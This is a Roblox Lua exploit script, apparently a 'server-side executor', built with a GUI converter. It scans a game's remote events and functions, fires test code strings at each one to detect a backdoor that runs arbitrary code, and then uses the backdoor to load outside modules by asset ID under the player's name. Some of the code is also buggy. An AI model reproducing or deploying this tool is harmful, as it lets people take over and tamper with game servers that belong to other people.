--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 15 | Scripts: 2 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.pss
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["Name"] = [[pss]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- StarterGui.pss.t
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Size"] = UDim2.new(0, 212, 0, 27);
G2L["2"]["Position"] = UDim2.new(0.11724, 0, 0.14447, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(201, 2, 255);
G2L["2"]["Name"] = [[t]];


-- StarterGui.pss.t.m
G2L["3"] = Instance.new("Frame", G2L["2"]);
G2L["3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3"]["Size"] = UDim2.new(0, 212, 0, 101);
G2L["3"]["Position"] = UDim2.new(-0.00015, 0, 0.98987, 0);
G2L["3"]["BorderColor3"] = Color3.fromRGB(201, 2, 255);
G2L["3"]["Name"] = [[m]];


-- StarterGui.pss.t.m.inj
G2L["4"] = Instance.new("TextButton", G2L["3"]);
G2L["4"]["TextSize"] = 14;
G2L["4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["4"]["Size"] = UDim2.new(0, 69, 0, 21);
G2L["4"]["BorderColor3"] = Color3.fromRGB(201, 2, 255);
G2L["4"]["Text"] = [[inject]];
G2L["4"]["Name"] = [[inj]];
G2L["4"]["Visible"] = false;
G2L["4"]["Position"] = UDim2.new(0.33491, 0, 0.39604, 0);


-- StarterGui.pss.t.m.main
G2L["5"] = Instance.new("ScrollingFrame", G2L["3"]);
G2L["5"]["Active"] = true;
G2L["5"]["BorderSizePixel"] = 0;
G2L["5"]["CanvasSize"] = UDim2.new(0, 0, 10, 0);
G2L["5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5"]["Name"] = [[main]];
G2L["5"]["Size"] = UDim2.new(0, 212, 0, 101);
G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["BackgroundTransparency"] = 1;


-- StarterGui.pss.t.m.main.main
G2L["6"] = Instance.new("Frame", G2L["5"]);
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["Name"] = [[main]];
G2L["6"]["BackgroundTransparency"] = 1;


-- StarterGui.pss.t.m.main.main.TextLabel
G2L["7"] = Instance.new("TextLabel", G2L["6"]);
G2L["7"]["BorderSizePixel"] = 0;
G2L["7"]["TextSize"] = 14;
G2L["7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7"]["BackgroundTransparency"] = 1;
G2L["7"]["Size"] = UDim2.new(0, 201, 0, 17);
G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["Text"] = [[scripts]];


-- StarterGui.pss.t.m.main.main.scripts
G2L["8"] = Instance.new("Frame", G2L["6"]);
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["Size"] = UDim2.new(0, 114, 0, 354);
G2L["8"]["Position"] = UDim2.new(0.23113, 0, 0.01683, 0);
G2L["8"]["BorderColor3"] = Color3.fromRGB(201, 2, 255);
G2L["8"]["Name"] = [[scripts]];


-- StarterGui.pss.t.m.main.main.scripts.UIListLayout
G2L["9"] = Instance.new("UIListLayout", G2L["8"]);
G2L["9"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.pss.t.m.main.main.scripts.a
G2L["a"] = Instance.new("TextButton", G2L["8"]);
G2L["a"]["TextSize"] = 14;
G2L["a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["a"]["Size"] = UDim2.new(0, 114, 0, 17);
G2L["a"]["BorderColor3"] = Color3.fromRGB(201, 2, 255);
G2L["a"]["Text"] = [[exser]];
G2L["a"]["Name"] = [[a]];


-- StarterGui.pss.t.m.main.main.scripts.b
G2L["b"] = Instance.new("TextButton", G2L["8"]);
G2L["b"]["TextSize"] = 14;
G2L["b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["b"]["Size"] = UDim2.new(0, 114, 0, 17);
G2L["b"]["BorderColor3"] = Color3.fromRGB(201, 2, 255);
G2L["b"]["Text"] = [[dex ss]];
G2L["b"]["Name"] = [[b]];


-- StarterGui.pss.t.m.main.main.scripts.c
G2L["c"] = Instance.new("TextButton", G2L["8"]);
G2L["c"]["TextSize"] = 14;
G2L["c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["c"]["Size"] = UDim2.new(0, 114, 0, 17);
G2L["c"]["BorderColor3"] = Color3.fromRGB(201, 2, 255);
G2L["c"]["Text"] = [[grand]];
G2L["c"]["Name"] = [[c]];


-- StarterGui.pss.t.tt
G2L["d"] = Instance.new("TextLabel", G2L["2"]);
G2L["d"]["BorderSizePixel"] = 0;
G2L["d"]["TextSize"] = 14;
G2L["d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d"]["BackgroundTransparency"] = 1;
G2L["d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d"]["Text"] = [[polaria loadstringed]];
G2L["d"]["Name"] = [[tt]];


-- StarterGui.pss.t.LocalScript
G2L["e"] = Instance.new("LocalScript", G2L["2"]);



-- StarterGui.pss.LocalScript
G2L["f"] = Instance.new("LocalScript", G2L["1"]);



-- StarterGui.pss.t.LocalScript
local function C_e()
local script = G2L["e"];
	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end;
task.spawn(C_e);
-- StarterGui.pss.LocalScript
local function C_f()
local script = G2L["f"];
	local services = {game.Lighting;game.ReplicatedStorage;game.Workspace}
	
	local mainREMOTE
	local main = script.Parent:WaitForChild('t')
	
	local plr=game:GetService('Players')['LocalPlayer']
	
	main.m.inj.Visible = true
	
	main.m.main.Visible = false
	
	local function exec(str)
		if mainREMOTE:IsA('RemoteFunction') then
			return mainREMOTE:InvokeServer(str)
		elseif mainREMOTE:IsA('RemoteEvent') then
			return mainREMOTE:FireServer(str)
		else
			print('no backdorr!!')
			return nil
		end
	end
	
	local onclick = function ()
		local list={}
		
		print('scanning')
		
		for _, s in ipairs(services) do
			for _, v in pairs(s:GetDescendants()) do
				if v:IsA('RemoteEvent') or v:IsA('RemoteFunction') then
					list[v.Name] = v
				end
			end
		end
		
		print('got all remotes now running')
		
		for _, r in ipairs(list) do
			if r:IsA('RemoteEvent') then
				r:FireServer('local new = Instance.new("Bone", workspace); new.Name = "pssGET"; print("in")')
				if workspace:WaitForChild('pssGET', 1) then
					print('found remote |' .. r.Name .. ' is a backdoor')
					r:FireServer('workspace:WaitForChild("pssGET"):Destroy()')
					mainREMOTE=r
					break
				else
					print('found remote | ' .. r.Name .. 'and hooked, no output so not backdoor.')
				end
			end
			if r:IsA('RemoteFunction') then
				r:InvokeServer('local new = Instance.new("Bone", workspace); new.Name = "pssGET"; print("in")')
				if workspace:WaitForChild('pssGET', 1) then
					print('found remote |' .. r.Name .. ' is a backdoor')
					r:InvokeServer('workspace:WaitForChild("pssGET"):Destroy()')
					mainREMOTE=r
					break
				else
					print('found remote | ' .. r.Name .. 'and hooked, no output so not backdoor.')
				end
			end
		end
		
	end
	
	main.m.inj.MouseButton1Click:Connect(function()
		onclick()
		if mainREMOTE == nil then
			main.m.inj.Text = 'no backdoor found'
			wait(2)
			main.Parent:Destroy()
		else
			main.m.inj.Text = 'backdoor found'
			wait(1)
			main.m.inj.Visible = false
			math.m.main.Visible = true
		end
	end)
	
	main.m.main.main.scripts.a.MouseButton1Click:Connect(function()
		exec('require(10868847330):pls("'..plr.Name..'")')
	end)
	
	main.m.main.main.scripts.b.MouseButton1Click:Connect(function()
		exec('require(14572394952)("'..plr.Name..'")')
	end)
	
	main.m.main.main.scripts.c.MouseButton1Click:Connect(function()
		exec('require(14572394952)("'..plr.Name..'")')
	end)
end;
task.spawn(C_f);

return G2L["1"], require;
